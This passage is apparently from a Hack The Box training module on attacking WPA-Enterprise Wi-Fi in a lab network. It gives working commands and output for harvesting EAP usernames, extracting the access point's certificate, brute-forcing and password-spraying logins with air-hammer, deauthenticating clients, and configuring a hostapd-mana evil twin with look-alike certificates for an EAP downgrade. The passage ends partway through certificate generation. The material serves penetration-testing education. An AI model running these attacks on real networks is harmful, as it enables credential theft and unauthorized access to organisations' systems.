Another effective tool for extracting domain and username information from clients is [crEAP](https://github.com/p0dalirius/crEAP). This tool works by utilizing airodump-ng in the background to scan for valid EAP handshakes. Once a valid handshake is detected, crEAP automatically extracts the username and domain information and presents it.

```shell
python2 /opt/crEAP/crEAP.py

                          ___________   _____ ___________
                 __________\_   _____/  /  _  \______    \
               _/ ___\_  __ \	__)_   /  /_\  \|     ___/
               \  \___|  | \/       \ /  |   \  \    |
                \___  >__| /_______  /\____|__  /____|
                    \/             \/         \/
  crEAP is a utility which will identify WPA Enterprise Mode Encryption types and if
  insecure protocols are in use, crEAP will harvest usernames and handshakes.

Version: 1.4

[-] Current Wireless Interfaces

eth0      no wireless extensions.

lo        no wireless extensions.

wlan0  IEEE 802.11  Mode:Master  Frequency:2.412 GHz  Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on

wlan1     IEEE 802.11  Mode:Master  Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on


Specify wireless interface:       (This will enable MONITOR mode) (wlan0, wlan2, etc): wlan0
Specify wireless channel: (Default Channel 6. Supports 2.4/5ghz spectrum): 1

[-] Enabling monitor interface and channel...

[-] Listening in the 2.4GHZ spectrum.

[-] Sniffing for EAPOL packets on wlan0mon channel 1...  Ctrl+C to exit

[!] EAP-PEAP Authentication Detected
[-] BSSID:         HTB-Corp
[-] Auth ID:       205
[-] User ID:       HTB\Ketty

```

If we’re not able to capture any valid user information after some time, we can perform a deauthentication attack to force clients to reconnect to the access point. If the access point has PMKID caching disabled, this will prompt a full EAP handshake, allowing crEAP to capture and display the username and domain name.

* * *

## EAP-PEAP and Anonymous Identities

In some enterprise environments, when the client responds with an identity, we may notice that it looks like anonymous or anonymous@something\_x. In this case, the client and access point are anonymizing identities. This makes it much more difficult for us to retrieve the username along with the password (in the hash or plaintext form) later on. This is handled differently per EAP/PEAP method.

For another perspective on anonymous identities, this article is a great resource:
[EAP-PEAP and EAP-TTLS Authentication](https://www.interlinknetworks.com/app_notes/eap-peap.htm).

### EAP-Identity = anonymous

In Wireshark, if we notice that the first identity response indicates the username `anonymous`, it means our network supports anonymous identities. Essentially this works like the following:

1. The first phase allows the establishment of the TLS tunnel through EAP-PEAP or EAP-TTLS,in which the anonymous identity is sent to the RADIUS server during the identity request and response steps.
2. Once the TLS tunnel is established, the true user identity is disclosed between the RADIUS server and the client. This effectively allows them to move forward with the remainder of the exchange.

### EAP-Identity = anonymous@realm\_x

Suppose we notice that the identity response is `anonymous@realm_x`. In this case, users are relegated to different realms, which indicate the RADIUS servers where their true identities reside. This process can be broken up like the following:

1. The first phase allows the establishment of the TLS tunnel through EAP-PEAP or EAP-TTLS. However, this time the identity includes the realm which their RADIUS server resides in. At this point, the communications occur between these users and the realm RADIUS as a proxy.
2. The remainder of the requests to finish authentication are then conducted between the client and the respective RADIUS server to finish 802.1x authentication.

* * *

## Obtaining the Certificate

To establish a TLS tunnel between the management network and a client, the access point (AP) sends its certificate to the client in clear text, which means it can be intercepted by anyone. This certificate contains valuable information that can be leveraged to create a fake certificate with matching fields for a Rogue AP attack. Additionally, it can reveal details about the corporate domain, internal emails, and other relevant information about the AP.

To obtain the handshake certificate in Wireshark, we can apply the filter `(wlan.sa == 9c:9a:03:39:bd:7a) && (tls.handshake.certificate)`. This filter focuses on the AP's BSSID to isolate the relevant packet containing the certificate. The extracted certificate can provide valuable information about the access point as shown in the below screenshot.

![image](https://academy.hackthebox.com/storage/modules/282/Enterprise/wpaep_handshakecertificate.png)

We can also use the [pcapFilter.sh](https://gist.githubusercontent.com/r4ulcl/f3470f097d1cd21dbc5a238883e79fb2/raw/78e097e1d4a9eb5f43ab0b2763195c04f02c4998/pcapFilter.sh) bash script to automatically extract the handshake certificate from a packet capture, which uses `tshark` to extract the certificate and copy it to the `/tmp/certs` directory.

```shell
bash /opt/pcapFilter.sh -f /home/wifi/WPA-01.cap -C

FILE: WPA-01.cap
Running as user "root" and group "root". This could be dangerous.

Certificate from 9c:9a:03:39:bd:7a to 0e:5c:6e:27:0b:25
Saved certificate in the file /tmp/certs/WPA-01.cap-9c:9a:03:39:bd:7a-0e:5c:6e:27:0b:25.cert.D9CU.der
Certificate:
    Data:
        Version: 1 (0x0)
        Serial Number:
            6c:74:5b:87:d0:58:7c:c5:52:71:80:a5:10:33:ef:ef:43:c3:cb:8a
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: C=US, ST=California, L=San Francisco, O=HTB, CN=htb.com
        Validity
            Not Before: Aug 14 11:01:52 2024 GMT
            Not After : Sep 13 11:01:52 2024 GMT
        Subject: C=US, ST=California, L=San Francisco, O=HTB, CN=htb.com
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
                    00:a4:8d:39:64:ef:0e:c5:2e:a9:a4:ee:df:71:ae:
                    4f:a7:86:76:d0:0f:cf:e7:d3:48:a7:81:51:90:34:
                    33:81:2d:d8:6f:0b:10:3a:22:c0:25:65:4e:9c:ef:
                    3c:38:72:14:86:de:70:64:95:bb:1b:28:26:92:2b:
                    d2:65:df:c3:f9:e8:bd:1d:3b:0e:c6:db:61:73:26:
                    8c:0b:94:82:4b:cd:f8:34:5a:9b:19:e2:df:74:85:
                    9a:42:3a:1c:17:11:79:bb:b5:35:46:3f:09:77:7c:
                    06:10:e1:d5:ef:3c:87:63:7c:53:37:14:ad:06:11:
                    f0:5a:1d:d6:1d:31:4b:3d:21:c2:37:42:bf:a5:81:
                    d6:36:f4:4e:39:5e:16:c9:7a:59:20:ab:80:80:fb:
                    56:70:00:b6:a3:e4:ee:57:67:4c:bc:a8:fd:91:8d:
                    c1:1e:9f:5a:87:ab:a5:b1:51:0c:4f:aa:14:8e:b0:
                    37:e7:fd:da:fd:75:3a:53:c6:60:52:93:ce:e1:c4:
                    53:2f:f8:c2:98:14:64:1e:35:a2:82:1f:64:00:f1:
                    36:51:fc:06:ae:78:06:ef:16:3a:d9:71:c5:47:03:
                    85:35:3f:45:8a:24:3f:06:02:3f:41:94:a6:30:94:
                    50:59:aa:b3:38:06:ab:73:08:2f:5a:ba:24:ce:96:
                    1b:43
                Exponent: 65537 (0x10001)
    Signature Algorithm: sha256WithRSAEncryption
    Signature Value:
        58:2f:82:f7:5d:4b:e3:ff:c2:a4:0c:62:96:85:bc:47:84:ad:
        f6:e7:d0:f0:05:f9:11:f7:15:5d:6f:8c:55:6e:9e:b5:0f:c4:
        2a:4d:b4:8c:69:83:8d:33:10:d2:14:c5:3e:89:13:a0:83:1b:
        b5:74:b5:83:ac:3d:3c:67:94:d6:76:93:d4:17:01:71:b1:f6:
        e9:df:51:f9:dc:f0:0f:bd:97:ab:87:91:e2:2a:f3:76:1e:99:
        c1:98:12:74:ed:a5:08:9c:f5:06:e8:e7:58:8e:72:e9:94:63:
        0f:1a:a5:2d:04:c3:83:8f:66:8c:9e:64:dc:fe:ba:63:5c:49:
        2b:80:fd:7b:08:c4:77:1d:03:ac:6b:70:b5:4b:c7:85:eb:58:
        44:c9:46:14:8e:ac:52:c0:32:8b:9d:8c:c7:88:66:04:e0:3b:
        24:68:0e:41:a2:9f:35:17:dd:18:9d:3f:d7:3a:03:fe:51:61:
        85:df:51:09:b9:c7:e4:b2:f5:f1:e8:81:26:93:0c:f9:06:10:
        c4:44:80:bf:64:ba:24:e2:f1:f8:21:4a:47:13:9c:f8:6a:93:
        bd:63:5c:d1:04:b6:e0:f3:6c:fd:64:0d:1c:a4:53:d7:18:bc:
        03:e8:81:48:bb:76:ac:8f:65:17:8a:b7:7e:55:15:ac:7e:66:
        52:27:b8:97
-----BEGIN CERTIFICATE-----
MIIDOzCCAiMCFGx0W4fQWHzFUnGApRAz7+9Dw8uKMA0GCSqGSIb3DQEBCwUAMFox
CzAJBgNVBAYTAlVTMRMwEQYDVQQIDApDYWxpZm9ybmlhMRYwFAYDVQQHDA1TYW4g
RnJhbmNpc2NvMQwwCgYDVQQKDANIVEIxEDAOBgNVBAMMB2h0Yi5jb20wHhcNMjQw
ODE0MTEwMTUyWhcNMjQwOTEzMTEwMTUyWjBaMQswCQYDVQQGEwJVUzETMBEGA1UE
CAwKQ2FsaWZvcm5pYTEWMBQGA1UEBwwNU2FuIEZyYW5jaXNjbzEMMAoGA1UECgwD
SFRCMRAwDgYDVQQDDAdodGIuY29tMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIB
CgKCAQEApI05ZO8OxS6ppO7fca5Pp4Z20A/P59NIp4FRkDQzgS3YbwsQOiLAJWVO
nO88OHIUht5wZJW7GygmkivSZd/D+ei9HTsOxtthcyaMC5SCS834NFqbGeLfdIWa
QjocFxF5u7U1Rj8Jd3wGEOHV7zyHY3xTNxStBhHwWh3WHTFLPSHCN0K/pYHWNvRO
OV4WyXpZIKuAgPtWcAC2o+TuV2dMvKj9kY3BHp9ah6ulsVEMT6oUjrA35/3a/XU6
U8ZgUpPO4cRTL/jCmBRkHjWigh9kAPE2UfwGrngG7xY62XHFRwOFNT9FiiQ/BgI/
QZSmMJRQWaqzOAarcwgvWrokzpYbQwIDAQABMA0GCSqGSIb3DQEBCwUAA4IBAQBY
L4L3XUvj/8KkDGKWhbxHhK3259DwBfkR9xVdb4xVbp61D8QqTbSMaYONMxDSFMU+
iROggxu1dLWDrD08Z5TWdpPUFwFxsfbp31H53PAPvZerh5HiKvN2HpnBmBJ07aUI
nPUG6OdYjnLplGMPGqUtBMODj2aMnmTc/rpjXEkrgP17CMR3HQOsa3C1S8eF61hE
yUYUjqxSwDKLnYzHiGYE4DskaA5Bop81F90YnT/XOgP+UWGF31EJucfksvXx6IEm
kwz5BhDERIC/ZLok4vH4IUpHE5z4apO9Y1zRBLbg82z9ZA0cpFPXGLwD6IFIu3as
j2UXird+VRWsfmZSJ7iX
-----END CERTIFICATE-----

All certs saved in the /tmp/certs/ directory

```

The extracted certificate reveals several critical details, such as `C=US, ST=California, L=San Francisco, O=HTB, CN=htb.com`. These details are invaluable when setting up our fake access point, as they allow us to configure it to closely mimic the legitimate AP, increasing the chances of deceiving clients into connecting.

* * *

## Finding Authentication Methods Supported by RADIUS Server

With a valid username in hand, we can use [EAP Buster](https://github.com/blackarrowsec/EAP_buster) to identify the specific EAP methods that the RADIUS server (behind a WPA-Enterprise access point) supports for that user.

```shell
/opt/EAP_buster/EAP_buster.sh HTB-Corp 'HTB\Ketty' wlan0mon

EAP_buster by BlackArrow [https://github.com/blackarrowsec/EAP_buster]

WARNING
You need to use legitimate EAP identities in order to start the 802.1X authentication process and get reliable results (EAP identites can be collected using sniffing tools such as crEAP, just make sure you use a real identity and not an anonymous one => https://github.com/Snizz/crEAP)

supported      =>  EAP-TLS
supported      =>  EAP-PEAP_MSCHAPv2
supported      =>  EAP-PEAP_TLS
supported      =>  EAP-PEAP_GTC
supported      =>  EAP-PEAP_OTP
supported      =>  EAP-PEAP_MD5-Challenge
supported      =>  EAP-TTLS_EAP-MD5-Challenge
supported      =>  EAP-TTLS_EAP-GTC
supported      =>  EAP-TTLS_EAP-OTP
supported      =>  EAP-TTLS_EAP-MSCHAPv2
supported      =>  EAP-TTLS_EAP-TLS
supported      =>  EAP-TTLS_MSCHAPv2
supported      =>  EAP-TTLS_MSCHAP
supported      =>  EAP-TTLS_PAP
supported      =>  EAP-TTLS_CHAP
not supported  =>  EAP-FAST_MSCHAPv2
not supported  =>  EAP-FAST_GTC
not supported  =>  EAP-FAST_OTP

```

Some users might be restricted to a limited set of authentication methods. Therefore, it's advisable to perform an authentication check for all identified users. For instance, while the user `HTB\Ketty` might support multiple EAP authentication methods, another user like `HTB\Henry` could have fewer supported methods.

```shell
/opt/EAP_buster/EAP_buster.sh HTB-Corp 'HTB\Harry' wlan0mon

EAP_buster by BlackArrow [https://github.com/blackarrowsec/EAP_buster]

WARNING
You need to use legitimate EAP identities in order to start the 802.1X authentication process and get reliable results (EAP identites can be collected using sniffing tools such as crEAP, just make sure you use a real identity and not an anonymous one => https://github.com/Snizz/crEAP)

supported      =>  EAP-TLS
not supported  =>  EAP-PEAP_MSCHAPv2
not supported  =>  EAP-PEAP_TLS
not supported  =>  EAP-PEAP_GTC
not supported  =>  EAP-PEAP_OTP
not supported  =>  EAP-PEAP_MD5-Challenge
not supported  =>  EAP-TTLS_EAP-MD5-Challenge
not supported  =>  EAP-TTLS_EAP-GTC
not supported  =>  EAP-TTLS_EAP-OTP
not supported  =>  EAP-TTLS_EAP-MSCHAPv2
not supported  =>  EAP-TTLS_EAP-TLS
not supported  =>  EAP-TTLS_MSCHAPv2
not supported  =>  EAP-TTLS_MSCHAP
not supported  =>  EAP-TTLS_PAP
not supported  =>  EAP-TTLS_CHAP
not supported  =>  EAP-FAST_MSCHAPv2
not supported  =>  EAP-FAST_GTC
not supported  =>  EAP-FAST_OTP

```

* * *

## Moving On

In this section, we covered the basics of reconnaissance on WPA-Enterprise networks, including how to identify usernames, domain names, and extract important information from handshake certificates. In the following section, we will explore how to conduct brute-force attacks using a user and password wordlist against the target.


# Performing Bruteforce Attacks

* * *

[Air-Hammer](https://github.com/Wh1t3Rh1n0/air-hammer) is a powerful tool for conducting online brute-force attacks against WPA Enterprise networks, which, despite being considered more secure than WPA-PSK, actually present a broader attack surface. In WPA-PSK networks, only one password grants access, while WPA Enterprise networks may have thousands of valid username and password combinations. Since the passwords are often chosen by end users, they are frequently simple and vulnerable to brute-force attacks, making WPA Enterprise networks susceptible to such threats.

## Air-Hammer Usage

To execute an attack using `air-hammer`, we must provide the following essential parameters:

- The intended wireless interface.
- The SSID (network name) of the target wireless network.
- A list of usernames to target.
- A single password, or a list of passwords, to be tested against each username.

```shell
python2 /opt/air-hammer/air-hammer.py

usage: air-hammer.py -i interface -e SSID -u USERFILE [-P PASSWORD]
                     [-p PASSFILE] [-s line] [-w OUTFILE] [-1] [-t seconds]

Perform an online, horizontal dictionary attack against a WPA Enterprise
network.

optional arguments:
  -i interface  Wireless interface (default: None)
  -e SSID       SSID of the target network (default: None)
  -u USERFILE   Username wordlist (default: None)
  -P PASSWORD   Password to try on each username (default: None)
  -p PASSFILE   List of passwords to try for each username (default: None)
  -s line       Optional start line to resume attack. May not be used with a
                password list. (default: 0)
  -w OUTFILE    Save valid credentials to a CSV file (default: None)
  -1            Stop after the first set of valid credentials are found
                (default: False)
  -t seconds    Seconds to sleep between each connection attempt (default:
                0.5)

```

Note: Air-hammer is installed in the /opt/air-hammer directory.

* * *

## Bruteforcing the Password

Imagine a scenario where we've already identified the username (e.g., `HTB\Sentinal`) during our reconnaissance phase, and now we want to perform a horizontal attack using the `rockyou.txt` password list. In this case, we would use `air-hammer` to carry out the attack. It's important to remember that the username we discovered includes a domain prefix ( `HTB`), so this must be included in the brute-force attempt to ensure success.

```shell
echo "HTB\Sentinal" > user.txt
python2 air-hammer.py -i wlan1 -e HTB-Corp -p /opt/rockyou.txt -u user.txt

[0]  Trying HTB\Sentinal:123456...
[0]  Trying HTB\Sentinal:12345...
[0]  Trying HTB\Sentinal:123456789...
[0]  Trying HTB\Sentinal:password...
[0]  Trying HTB\Sentinal:iloveyou...
[0]  Trying HTB\Sentinal:princess...
[0]  Trying HTB\Sentinal:1234567...
[0]  Trying HTB\Sentinal:rockyou...
[0]  Trying HTB\Sentinal:12345678...
[0]  Trying HTB\Sentinal:abc123...
[0]  Trying HTB\Sentinal:nicole...
[0]  Trying HTB\Sentinal:daniel...
[0]  Trying HTB\Sentinal:babygirl...
[0]  Trying HTB\Sentinal:basketball...
[0]  Trying HTB\Sentinal:pretty...
[0]  Trying HTB\Sentinal:loveyou...
[0]  Trying HTB\Sentinal:amanda...
[0]  Trying HTB\Sentinal:hannah...
[0]  Trying HTB\Sentinal:superman...
[0]  Trying HTB\Sentinal:1234567890...
[0]  Trying HTB\Sentinal:bubbles...
[0]  Trying HTB\Sentinal:joshua...
[0]  Trying HTB\Sentinal:jennifer...
[0]  Trying HTB\Sentinal:carlos...
[0]  Trying HTB\Sentinal:andrea...
[0]  Trying HTB\Sentinal:secret...
[!] VALID CREDENTIALS: HTB\Sentinal:football
[0]  Trying HTB\Sentinal:chocolate...

```

* * *

## Performing Password Spray

Once we have a valid password, we can employ a [reverse brute-force](https://en.m.wikipedia.org/wiki/Brute-force_attack#Reverse_brute-force_attack) attack. In this approach, `air-hammer` tries to authenticate to the target network by testing the given password with each username in the list. If multiple passwords are provided, the tool will attempt each username with the first password before moving on to the next password.

We can obtain a user list from [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames/tree/master). However, to make these usernames valid for login, we need to add the appropriate domain prefix to each entry. We can achieve this by using the following command:

```shell
cat /opt/statistically-likely-usernames/john.txt | awk '{print "HTB\\" $1}'

HTB\john
HTB\michael
HTB\david
HTB\chris
HTB\mike
HTB\james
HTB\mark
HTB\jason
HTB\robert
HTB\jessica
HTB\sarah
HTB\jennifer

```

Once we have prepared our user list with the appropriate domain prefix, we can save it to a file ( `domain_users.txt`) and proceed with the password spray attack. Using `air-hammer`, we'll test a specified password against each username in the list to identify valid credentials, as shown below.

```shell
python2 air-hammer.py -i wlan1 -e HTB-Corp -P football -u domain_users.txt

[0]  Trying HTB\john:football...
[1]  Trying HTB\michael:football...
[2]  Trying HTB\david:football...
[3]  Trying HTB\chris:football...
[4]  Trying HTB\mike:football...
[5]  Trying HTB\james:football...
[6]  Trying HTB\mark:football...
[7]  Trying HTB\jason:football...
[!] VALID CREDENTIALS: HTB\lisa:football
[8]  Trying HTB\robert:football...
[9]  Trying HTB\jessica:football...
[10]  Trying HTB\sarah:football...
[11]  Trying HTB\jennifer:football...
[12]  Trying HTB\paul:football...

```

If we're fortunate, we may discover additional valid credentials (particularly if other users have chosen the same password). This could potentially reveal multiple entry points into the network, increasing the effectiveness of our attack.

* * *

## Resuming Cancelled Attack

`Air-Hammer` also supports resuming from a cancelled or failed reverse brute-force attack. To do so, we may use the `-s` flag to specify the username number from the left side of the output. This allows us to continue the brute-force attack from where it left off, avoiding the need to restart from the beginning.

```shell
python2 air-hammer.py -i wlan1 -e HTB-Corp -P football -u domain_users.txt -s 65

[65]  Trying HTB\heather:football...
[66]  Trying HTB\bill:football...
[67]  Trying HTB\katie:football...
[68]  Trying HTB\kyle:football...
[69]  Trying HTB\patrick:football...
[70]  Trying HTB\stephen:football...
[71]  Trying HTB\aaron:football...
[72]  Trying HTB\angela:football...
[73]  Trying HTB\elizabeth:football...

```

* * *

## Moving On

This concludes our overview of basic reconnaissance and brute-force attacks on WPA Enterprise networks. In the upcoming sections, we will explore more advanced techniques, including EAP downgrade attacks, traditional Evil-Twin attacks, PEAP Relay attacks, and EAP-TLS abuse.


# EAP Downgrade Attack (Enumeration)

* * *

When a client connects to a WPA-Enterprise capable network, it must undergo the authentication process we previously discussed. If we aim to exploit the EAP negotiation process, which is integral to 802.1x security, we can potentially downgrade the standard for our evil-twin setup to facilitate credential retrieval. EAP and PEAP methods can be interchanged for compatibility among client devices, allowing us to identify the standards they use to connect to our evil-twin network.

![EAP Downgrade Attacks](https://academy.hackthebox.com/storage/modules/282/Enterprise/rougue.png)

The client will attempt to connect to our fake access point (Rogue AP) or evil twin using all supported authentication methods. However, if our access point only supports EAP-GTC, the client will ultimately downgrade to that method and provide the credentials in clear text.

![EAP Downgrade Attacks](https://academy.hackthebox.com/storage/modules/282/Enterprise/eap-downgrade.png)

Using this method, we present EAP authentication methods in order of weakest to strongest. If a client accepts a weak method, such as `EAP-GTC` or `TTLS-PAP`, we may be able to retrieve the credentials in clear text. If these methods are not accepted, the client might still accept a weaker standard, allowing us to crack their password more quickly. In the next section, we will explore how to implement this technique using the `hostapd-wpe` tool.

One challenge with EAP downgrade attacks is that client devices can only negotiate methods they support. As a result, when utilizing this approach, we may encounter limitations in getting certain client devices to downgrade to a sufficiently low standard that justifies our efforts.

* * *

## Enumeration

We will need two WLAN interfaces to perform the downgrade attack. One interface, `wlan0`, will be set to monitor mode for scanning and conducting deauthentication attacks against clients. The second interface, `wlan1`, will be in master mode, hosting our fake access point (AP) for clients to connect to.

```shell
iwconfig

wlan0     IEEE 802.11  ESSID:off/any
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:on

wlan1     IEEE 802.11  ESSID:off/any
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:on

```

We begin by enabling monitor mode on our `wlan0` interface using `airmon-ng`.

```shell
sudo airmon-ng start wlan0

Found 2 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    559 NetworkManager
    798 wpa_supplicant

PHY     Interface       Driver          Chipset

phy0    wlan0           rt2800usb       Ralink Technology, Corp. RT2870/RT3070
                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
                (mac80211 station mode vif disabled for [phy0]wlan0)

```

Once our interface is in monitor mode, we can use `airodump-ng` to scan for available Wi-Fi networks and their associated clients.

```shell
airodump-ng wlan0mon -c 1 -w WPA

 CH  1 ][ Elapsed: 6 s ][ 2024-08-23 09:47

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 9C:9A:03:39:BD:7A  -28 100       97        5    0   1   54   WPA2 CCMP   MGT  HTB-Corp

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 9C:9A:03:39:BD:7A  16:C5:68:79:A8:12  -29   12 -54      0        4

```

From the output above, we can see that the `HTB-Corp` Wi-Fi network is available with the BSSID `9C:9A:03:39:BD:7A`, and has a client connected to it with the MAC address `16:C5:68:79:A8:12`. Let's proceed with the downgrade attack to determine if we can obtain clear text credentials from this client.

If PMK caching is disabled on the access point (AP), we can perform a deauthentication attack on the client using `aireplay-ng` to capture a valid WPA handshake, which includes EAP packets. This allows us to identify the username.

```shell
aireplay-ng -0 3 -a 9C:9A:03:39:BD:7A -c 16:C5:68:79:A8:12 wlan0mon

19:32:04  Waiting for beacon frame (BSSID: 9C:9A:03:39:BD:7A) on channel 1
19:32:05  Sending 64 directed DeAuth (code 7). STMAC: [16:C5:68:79:A8:12] [ 0| 0 ACKs]
19:32:05  Sending 64 directed DeAuth (code 7). STMAC: [16:C5:68:79:A8:12] [ 0| 0 ACKs]
19:32:06  Sending 64 directed DeAuth (code 7). STMAC: [16:C5:68:79:A8:12] [ 0| 0 ACKs]

```

When analyzing the captured .cap file in Wireshark, apply the `eap` filter. Navigate to the `"Response, Identity"` packet, and we will find the username.

![image](https://academy.hackthebox.com/storage/modules/282/Enterprise/downgrade_username.PNG)

As shown in the output above, we have identified the username `HTB\Sentinal`. We can now utilize `EAP-Buster` to determine if the RADIUS server supports other authentication methods for this user.

```shell
/opt/EAP_buster/EAP_buster.sh HTB-Corp 'HTB\Sentinal' wlan0mon

EAP_buster by BlackArrow [https://github.com/blackarrowsec/EAP_buster]

WARNING
You need to use legitimate EAP identities in order to start the 802.1X authentication process and get reliable results (EAP identites can be collected using sniffing tools such as crEAP, just make sure you use a real identity and not an anonymous one => https://github.com/Snizz/crEAP)

supported      =>  EAP-TLS
supported      =>  EAP-PEAP_MSCHAPv2
supported      =>  EAP-PEAP_TLS
supported      =>  EAP-PEAP_GTC
supported      =>  EAP-PEAP_OTP
supported      =>  EAP-PEAP_MD5-Challenge
supported      =>  EAP-TTLS_EAP-MD5-Challenge
supported      =>  EAP-TTLS_EAP-GTC
supported      =>  EAP-TTLS_EAP-OTP
supported      =>  EAP-TTLS_EAP-MSCHAPv2
supported      =>  EAP-TTLS_EAP-TLS
supported      =>  EAP-TTLS_MSCHAPv2
supported      =>  EAP-TTLS_MSCHAP
supported      =>  EAP-TTLS_PAP
supported      =>  EAP-TTLS_CHAP
not supported  =>  EAP-FAST_MSCHAPv2
not supported  =>  EAP-FAST_GTC
not supported  =>  EAP-FAST_OTP

```

As shown in the output, the RADIUS server supports several authentication methods for this user. By forcing the currently connected client to reconnect to our rogue access point using a weaker authentication method, such as `GTC` or `TTLS-PAP`, we can potentially capture the user's credentials in clear text.

In the next section, we will use all of the information we gathered to perform the EAP downgrade attack.


# EAP Downgrade Attack (Attacking)

We'll explore two ways to perform this attack. The first method involves using `hostapd-mana`, where we manually create self-signed certificates and set up the access point. The second method utilizes the `eaphammer` tool, which automates the entire process for us.

* * *

## Using hostapd-mana

To conduct a downgrade attack on clients connected to an enterprise network, we first need to create a sophisticated evil-twin access point (AP). This AP must include a RADIUS server and the ability to negotiate the EAP method that clients will use to connect. [Hostapd-mana](https://github.com/sensepost/hostapd-mana) is an excellent tool for this purpose, as it supports KARMA attacks, negotiable EAP methods, and other valuable features.

To get started, we need to create a `hostapd.conf` file with the following content:

```configuration
# Interface configuration
interface=wlan1
ssid=HTB-Corp
channel=1
auth_algs=3
wpa_key_mgmt=WPA-EAP
wpa_pairwise=TKIP CCMP
wpa=3
hw_mode=g
ieee8021x=1

# EAP Configuration
eap_server=1
eap_user_file=hostapd.eap_user

# Mana Configuration
enable_mana=1
mana_loud=1
mana_credout=credentials.creds
mana_eapsuccess=1
mana_wpe=1

# Certificate Configuration
ca_cert=ca.pem
server_cert=server.pem
private_key=server-key.pem
dh_file=dh.pem

```

* * *

In this file, we specify many parameters. These parameters can be broken down like the following:

| Item | Description |
| --- | --- |
| `Interface` | The interface on which we will be hosting the access point. |
| `SSID` | This needs to be the same as the SSID of the target network. |
| `Channel 3` | If our interface has the same spoofed MAC address as the target network's BSSID, we need this to be a different channel. If the MAC address of our interface is different, this can be the same channel as the target AP. |
| `eap_user_file` | This is the location of our eap user file. We will use this file to control the EAP negotiation of any client which connects to our network. Doing so will allow us to downgrade the EAP method correctly in order to retrieve weaker hashes or even plain text credentials. |
| `enable_mana` | Enables MANA mode, which is the KARMA beacon attack. This will help stations know that our access point exists, making transitions easier and our attack less intrusive. We may still need to employ deauthentication later. |
| `Mana_loud` | This option sets whether or not all beacons will be retransmitted to clients. If we are attempting to be stealthy, we could set this to zero. |
| `Mana_credout` | The location where we will be storing any captured credentials or hashes. |
| `Mana_WPE` | Enables EAP credential capture mode, which is what we need in order to receive client credentials. |
| `Certificate Configuration` | We must include the location of our different SSL certs which we will generate later. This is due to the cert requirements for the TTLS-PAP and GTC modes respectively among others. |

* * *

Next, to gain refined control over EAP method negotiation between our fake access point and the client, we need to create the `hostapd.eap_user` file referenced in our `hostapd.conf` file for Mana with the following content:

```configuration
* TTLS,PEAP,TLS,MD5,GTC
"t" TTLS-PAP,GTC,TTLS-CHAP,TTLS-MSCHAP,TTLS-MSCHAPV2,MD5 "challenge1234" [2]

```

* * *

With this `hostapd.eap_user` file, we instruct client devices attempting to join our network to use TTLS-PAP as their authentication method. In 802.1x security, the client and access point negotiate which method to use. By specifying the order of methods—starting with TTLS-PAP, then GTC, followed by TTLS-CHAP, TTLS-MSCHAP, and so on-we can potentially trick vulnerable client devices into using TTLS-PAP or GTC, thereby exposing their cleartext identity and credentials. Additionally, we specify the challenge password `challenge1234`, which will be used in the generation of our server's private keys.

To use any TLS-based method, we must first generate our keys and certificates; otherwise, the client device will be unable to complete the authentication process with our fake access point. The first step is to generate our Diffie-Hellman parameters. This can be done using the following command:

```shell
openssl dhparam -out dh.pem 2048

Generating DH parameters, 2048 bit long safe prime
..........................................................................................................................................................................................................................................................................................+......................................................................++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*

```

Next, we need to generate our Certificate Authority (CA) key. This can be accomplished with the following command:

```shell
openssl genrsa -out ca-key.pem 2048

```

We also need to generate the x509 certificate to create our final ca.pem file. We'll aim to closely match the details of the legitimate access point, to minimize suspicion from connected clients and prevent them from realizing it's a fake AP.

```shell
openssl req -new -x509 -nodes -days 100 -key ca-key.pem -out ca.pem

You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:US
State or Province Name (full name) [Some-State]:California
Locality Name (eg, city) []:San Fransisco
Organization Name (eg, company) [Internet Widgits Pty Ltd]:Hack The Box
Organizational Unit Name (eg, section) []:HTB
Common Name (e.g. server FQDN or YOUR name) []:HTB
Email Address []:[email protected]

```

When generating our x509 certificates, we should aim to make the information as similar as possible to that of the actual target. If we have access to a certificate from the internal network, using it would be preferable to self-signed certificates, as it may be trusted by the client devices.

At this stage, we need to generate our server certificate and private key, as specified in the hostapd.conf file. This can be done with the following command:

```shell
openssl req -newkey rsa:2048 -nodes -days 100 -keyout server-key.pem -out server-key.pem

Ignoring -days without -x509; not generating a certificate
.....+......+.....+....+++++++++++++++++++++++++++++++++++++++*......+....+...+..+.+..+++++++++++++++++++++++++++++++++++++++*.+..+.......+..+......+...+.+...+........+...+....+...+.....+....+...+.....+.+..+...+....+.......
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:US
State or Province Name (full name) [Some-State]:California
Locality Name (eg, city) []:San Fransisco
Organization Name (eg, company) [Internet Widgits Pty Ltd]:Hack The Box
Organizational Unit Name (eg, section) []:HTB
Common Name (e.g. server FQDN or YOUR name) []:HTB
Email Address []:[email protected]

Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:challenge1234
